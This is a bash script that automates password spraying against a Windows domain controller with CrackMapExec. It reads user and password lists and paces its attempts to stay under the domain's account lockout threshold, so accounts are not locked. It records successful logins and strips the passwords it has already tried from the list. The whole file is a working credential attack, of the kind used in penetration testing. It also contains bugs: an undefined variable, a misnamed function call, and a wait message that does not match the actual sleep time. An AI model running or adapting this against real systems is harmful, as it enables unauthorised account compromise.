#!/bin/bash

# Password spraying with CrackMapExec according domain password policy
# If you cannot enumerate the domain password policy then attack on the safe side!! 
# Modifications of the origianl script from @0rbz_ to make it play safer. 
# Author: Dominic Clark (@FreeZeroDays)

# Check if CrackMapExec is installed, if not then prompt the user to install
if ! command -v crackmapexec &> /dev/null
then
    echo "Hey there buddy.. You don't have CrackMapExec installed, are you okay?"
    exit
fi

# Read data from the user and store it for future use
read -p "Select your weapon of choice (smb, winrm, mssql): " attack_method
read -p "Enter the Domain Controller IP Address: " domain_controller_ip
read -p "Please provide a user list: " user_list
read -p "Please provide a password list: " password_list
read -p "Provide the 'Reset Account Lockout Counter After': " lockout_counter
read -p "Enter the 'Account Lockout Threshold' value: " lockout_threshold

cme_output () {
    cat cmetimer.txt | grep "[+]" 2>/dev/null
    if [ $? == 0 ]; then
        echo "[+] Successful logins:"
        cat cmetimer.txt | grep "[+]"
    else
        echo "[-] No successful logins."
    fi
}

while true; do
    pass_num=$(head -n $(echo $((lockout_threshold-2))) $password_list)
    echo "[*] Trying $(echo $((lockout_threshold-2))) passwords every $(echo $((lockout_counter+5))) minutes against $(echo $domain_controller_ip) and using $(echo $passwords) and $(echo $user_list) lists."
    sleep 3
    for password in $pass_num; do
        crackmapexec $attack_method $domain_controller_ip -u $(cat $user_list) -p $password --continue-on-success | tee -a cmetimer.txt
    done
    sed -i -e "1,$((lockout_threshold-2))d" $password_list
    cme_output
    
	t='date +"%T"'
	echo "[+] Waiting $(echo $((lockout_counter+1))) minutes..."
	echo "[+] Last run:" `$t`

	# Timer for performing password spraying
    timer=$((lockout_counter+5))
    sleep $timer\m
    if [[ ! -s $passwords ]]; then
        cmeoutput
        echo "Done."
        exit
    fi
done
